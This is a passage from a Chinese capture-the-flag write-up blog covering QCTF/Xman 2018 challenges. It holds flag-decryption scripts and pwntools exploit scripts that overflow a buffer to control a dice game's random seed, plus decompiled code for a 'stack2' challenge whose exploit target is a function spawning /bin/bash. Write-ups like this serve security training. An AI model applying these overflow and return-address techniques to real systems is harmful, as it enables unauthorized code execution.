class="number">7</span>,<span class="string">"w"</span>:<span class="number">34</span>,<span class="string">"x"</span>:<span class="number">0</span>,<span class="string">"y"</span>:<span class="number">62</span>,<span class="string">"z"</span>:<span class="number">0</span>,<span class="string">"_"</span>:<span class="number">245</span>&#125;</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">r'QCTF&#123;that_girl_saying_no_for_your_vindicate&#125;'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encypt</span><span class="params">(flag)</span>:</span></span><br><span class="line">	f = flag[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">	e0 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">		e0.append(dic[i])</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	temp = e0[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">while</span> s[i] != <span class="number">0</span>:</span><br><span class="line">		e0[i] = e0[s[i]]</span><br><span class="line">		i = s[i]</span><br><span class="line">	e0[i] = temp</span><br><span class="line">	temp = (e0[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) &amp; <span class="number">0x7</span></span><br><span class="line">	enc = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(e0)<span class="number">-1</span>):</span><br><span class="line">		enc += chr(((e0[i] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xff</span>) | ((e0[i+<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x7</span>))</span><br><span class="line">	enc += chr(((e0[len(e0)<span class="number">-1</span>] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xff</span>) | temp)</span><br><span class="line">	<span class="keyword">return</span> enc</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decypt</span><span class="params">(enc)</span>:</span></span><br><span class="line">	<span class="comment"># enc = open("out").read()</span></span><br><span class="line"> </span><br><span class="line">	d0 = []</span><br><span class="line">	temp = ord(enc[len(enc)<span class="number">-1</span>]) &amp; <span class="number">0x7</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">		d0.append((temp &lt;&lt; <span class="number">5</span>) | (ord(enc[i]) &gt;&gt; <span class="number">3</span>))</span><br><span class="line">		temp = ord(enc[i]) &amp; <span class="number">0x7</span></span><br><span class="line"> </span><br><span class="line">	i = <span class="number">37</span></span><br><span class="line">	temp = d0[<span class="number">37</span>]</span><br><span class="line">	<span class="keyword">while</span> s.index(i) != <span class="number">37</span>:</span><br><span class="line">		d0[i] = d0[s.index(i)]</span><br><span class="line">		i = s.index(i)</span><br><span class="line">	d0[i] = temp</span><br><span class="line">	flag = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> d0:</span><br><span class="line">		flag.append(list(dic.keys())[list(dic.values()).index(i)])</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"QCTF&#123;%s&#125;"</span> % <span class="string">''</span>.join(flag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> decypt(encypt(flag))</span><br></pre></td></tr></table></figure>
<p>放上<a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/writeups/qctf2018/readme.md" target="_blank" rel="noopener">2019大师傅的爆破脚本</a>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev_bit_oper</span><span class="params">(src)</span>:</span></span><br><span class="line">	res = [<span class="number">0</span>] * <span class="number">0x26</span></span><br><span class="line">	<span class="comment"># a1[i] = (a1[i] &lt;&lt; 3) | (a1[i + 1] &gt;&gt; 5);</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">0x26</span>):</span><br><span class="line">		res[i] |= (src[i] &gt;&gt; <span class="number">3</span>)</span><br><span class="line">		res[(i + <span class="number">1</span>) % <span class="number">0x26</span>] |= ((src[i] &lt;&lt; <span class="number">5</span>) % <span class="number">0x100</span>)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">out = [<span class="number">0xec</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x41</span>, <span class="number">0xe1</span>, <span class="number">0xf7</span>, <span class="number">0xaa</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xed</span>, <span class="number">0x29</span>, <span class="number">0x99</span>, <span class="number">0x39</span>, <span class="number">0xf3</span>, <span class="number">0xb7</span>, <span class="number">0xa9</span>,</span><br><span class="line"> <span class="number">0xe7</span>, <span class="number">0xac</span>, <span class="number">0x2b</span>, <span class="number">0xb7</span>, <span class="number">0xab</span>, <span class="number">0x40</span>, <span class="number">0x9f</span>, <span class="number">0xa9</span>, <span class="number">0x31</span>, <span class="number">0x35</span>, <span class="number">0x2c</span>, <span class="number">0x29</span>, <span class="number">0xef</span>, <span class="number">0xa8</span>, <span class="number">0x3d</span>, <span class="number">0x4b</span>,</span><br><span class="line"> <span class="number">0xb0</span>, <span class="number">0xe9</span>, <span class="number">0xe1</span>, <span class="number">0x68</span>, <span class="number">0x7b</span>, <span class="number">0x41</span>]</span><br><span class="line"></span><br><span class="line">tab = [<span class="number">0x16</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1E</span>, <span class="number">0x18</span>, <span class="number">0x9</span>,</span><br><span class="line"><span class="number">0x1</span>, <span class="number">0x15</span>, <span class="number">0x7</span>, <span class="number">0x12</span>, <span class="number">0x0A</span>, <span class="number">0x8</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x0B</span>, <span class="number">0x14</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>,</span><br><span class="line"><span class="number">0x5</span>, <span class="number">0x19</span>, <span class="number">0x24</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x25</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x21</span>, <span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x23</span>]</span><br><span class="line"></span><br><span class="line">song_freq = [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000068</span>, <span class="number">0x0000001e</span>,</span><br><span class="line"><span class="number">0x0000000f</span>, <span class="number">0x0000001d</span>, <span class="number">0x000000a9</span>, <span class="number">0x00000013</span>,</span><br><span class="line"><span class="number">0x00000026</span>, <span class="number">0x00000043</span>, <span class="number">0x0000003c</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000014</span>, <span class="number">0x00000027</span>, <span class="number">0x0000001c</span>, <span class="number">0x00000076</span>,</span><br><span class="line"><span class="number">0x000000a5</span>, <span class="number">0x0000001a</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003d</span>,</span><br><span class="line"><span class="number">0x00000033</span>, <span class="number">0x00000085</span>, <span class="number">0x0000002d</span>, <span class="number">0x00000007</span>,</span><br><span class="line"><span class="number">0x00000022</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003e</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000028</span>, <span class="number">0x00000047</span>, <span class="number">0x00000000</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000042</span>, <span class="number">0x000000f5</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_assign_conversion</span><span class="params">(tab)</span>:</span></span><br><span class="line">	ret = range(<span class="number">0</span>, <span class="number">0x26</span>)</span><br><span class="line">	x = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> tab[x] != <span class="number">0</span>:</span><br><span class="line">		ret[x] = ret[tab[x]]</span><br><span class="line">		x = tab[x]</span><br><span class="line">	ret[x] = <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_assign</span><span class="params">(tab)</span>:</span></span><br><span class="line">	ret = []</span><br><span class="line">	x = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> tab[x] != <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">print</span> hex(x) + <span class="string">" = "</span> + hex(tab[x])</span><br><span class="line">		ret.append((tab[x],x))</span><br><span class="line">		x = tab[x]</span><br><span class="line">	ret.append((<span class="number">0</span>,x))</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_order_2</span><span class="params">(order2, l)</span>:</span></span><br><span class="line">	ret = [<span class="number">0</span>] * <span class="number">0x26</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">0x26</span>):</span><br><span class="line">		ret[order2[i]] = l[i]</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_order</span><span class="params">(order, l)</span>:</span></span><br><span class="line">	ret = list(l)</span><br><span class="line">	rorder = list(order)</span><br><span class="line">	rorder.reverse()</span><br><span class="line">	<span class="keyword">print</span> rorder</span><br><span class="line">	<span class="keyword">print</span> len(rorder)</span><br><span class="line">	<span class="keyword">for</span> o <span class="keyword">in</span> rorder:</span><br><span class="line">		ret[o[<span class="number">0</span>]] = l[o[<span class="number">1</span>]]</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">frequecies_to_nums</span><span class="params">(frequecies, freq_tab)</span>:</span></span><br><span class="line">	ret = []</span><br><span class="line">	<span class="keyword">for</span> f <span class="keyword">in</span> frequecies:</span><br><span class="line">		ret.append(freq_tab.index(f))</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_chars</span><span class="params">(num)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">45</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'\n'</span></span><br><span class="line">	<span class="keyword">elif</span> num &gt;= <span class="number">42</span> <span class="keyword">and</span> num &lt;= <span class="number">44</span>:</span><br><span class="line">		<span class="keyword">return</span> chr(num - <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">41</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'\''</span></span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">40</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">','</span></span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">39</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'.'</span></span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">37</span> <span class="keyword">or</span> num == <span class="number">38</span>:</span><br><span class="line">		<span class="keyword">return</span> chr(num + <span class="number">21</span>)</span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">36</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'?'</span></span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">46</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'_'</span></span><br><span class="line">	<span class="keyword">elif</span> num &gt;= <span class="number">0</span> <span class="keyword">and</span> num &lt; <span class="number">10</span>:</span><br><span class="line">		<span class="keyword">return</span> chr(num + ord(<span class="string">'0'</span>))</span><br><span class="line">	<span class="keyword">elif</span> num &gt;= <span class="number">10</span> <span class="keyword">and</span> num &lt;= <span class="number">35</span>:</span><br><span class="line">		<span class="keyword">return</span> chr(num + <span class="number">87</span>) <span class="comment">#55</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">assert</span> <span class="keyword">False</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rev_snd = rev_bit_oper(out)</span><br><span class="line"><span class="keyword">print</span> map(hex, rev_snd)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> rev_snd:</span><br><span class="line">	<span class="keyword">assert</span>(x <span class="keyword">in</span> song_freq)</span><br><span class="line"></span><br><span class="line">frequecies = recover_order_2(get_assign_conversion(tab), rev_snd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"assign: "</span></span><br><span class="line"><span class="keyword">print</span> get_assign(tab)</span><br><span class="line"><span class="keyword">print</span> map(hex, frequecies)</span><br><span class="line"></span><br><span class="line">nums = frequecies_to_nums(frequecies, song_freq)</span><br><span class="line"><span class="keyword">print</span> map(hex, nums)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(map(num_to_chars, nums))</span><br></pre></td></tr></table></figure>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Xman-dice-game"><a href="#Xman-dice-game" class="headerlink" title="Xman-dice_game"></a>Xman-dice_game</h2><p>放进ida看main函数：</p>
<p><img src="http://t1.aixinxi.net/o_1cidvqgvc1i7rg9n1jvm8af6ufa.png-j.jpg" alt="main函数内容"></p>
<p>buf存在溢出，可以覆盖到seed。想法就是通过爆破得到随机数的顺序。脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">	<span class="comment"># p = remote("47.96.239.28", 9999)</span></span><br><span class="line">	p.readuntil(<span class="string">"name:"</span>)</span><br><span class="line">	payload = p64(<span class="number">0xabcdabcdabcdabcd</span>) * <span class="number">8</span> + p64(<span class="number">0</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	ans_len = len(ans)</span><br><span class="line">	log.success(ans)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">while</span> i &lt; ans_len:</span><br><span class="line">			p.readuntil(<span class="string">"nt(1~6): "</span>)</span><br><span class="line">			n = ans[i]</span><br><span class="line">			i += <span class="number">1</span></span><br><span class="line">			p.sendline(n)</span><br><span class="line">		random.seed(time.time())</span><br><span class="line">		n = str(int(random.randint(<span class="number">1</span>, <span class="number">6</span>)))</span><br><span class="line">		p.readuntil(<span class="string">"nt(1~6): "</span>)</span><br><span class="line">		p.sendline(n)</span><br><span class="line">		print(n)</span><br><span class="line">		sub = p.readuntil(<span class="string">'.'</span>)</span><br><span class="line">		log.info(sub)</span><br><span class="line">		<span class="keyword">return</span> sub, n</span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span> len(ans) == <span class="number">50</span>:</span><br><span class="line">		print(ans)			</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	res, n = test(ans)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"win"</span> <span class="keyword">in</span> res:</span><br><span class="line">		ans += n</span><br></pre></td></tr></table></figure>
<p>通过得到的顺序作为payload，脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line"><span class="comment"># p = remote("47.96.239.28", 9999)</span></span><br><span class="line">p.readuntil(<span class="string">"name:"</span>)</span><br><span class="line">payload = p64(<span class="number">0xabcdabcdabcdabcd</span>) * <span class="number">8</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ans = <span class="string">"25426251423232651155634433322261116425254446323361"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">50</span>:</span><br><span class="line">	p.readuntil(<span class="string">"nt(1~6): "</span>)</span><br><span class="line">	n = ans[i]</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	p.sendline(n)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://t1.aixinxi.net/o_1cie3b4ho2g4khq1gbusv0106ua.png-j.jpg" alt="得到flag"></p>
<h2 id="Xan-stack2"><a href="#Xan-stack2" class="headerlink" title="Xan-stack2"></a>Xan-stack2</h2><p><code>checksec</code>发现PIE没开。</p>
<p><img src="https://t1.aixinxi.net/o_1cj0u5enu19d1d2cbam2qb1t3ia.png-j.jpg" alt="PIE没有开"></p>
<p>拖进ida后f5：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还能看到有一个<code>hackhere</code>函数，直接调用了<code>system(&quot;/bin/bash&quot;)</code>，由于没开PIE，可以直接跳到这个地址。所以这题的思路就是将<code>main</code>函数return地址覆盖为<code>hackhere</code>的地址。</p>
<p><img src="https://t1.aixinxi.net/o_1cj0u737gceljoj9jn1fbb14opa.png-j.jpg" alt="hackhere"></p>
<p>具体的payload如何构造还不是很清楚，<a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/" target="_blank" rel="noopener">大佬的wp</a>中的exp如下：</p>
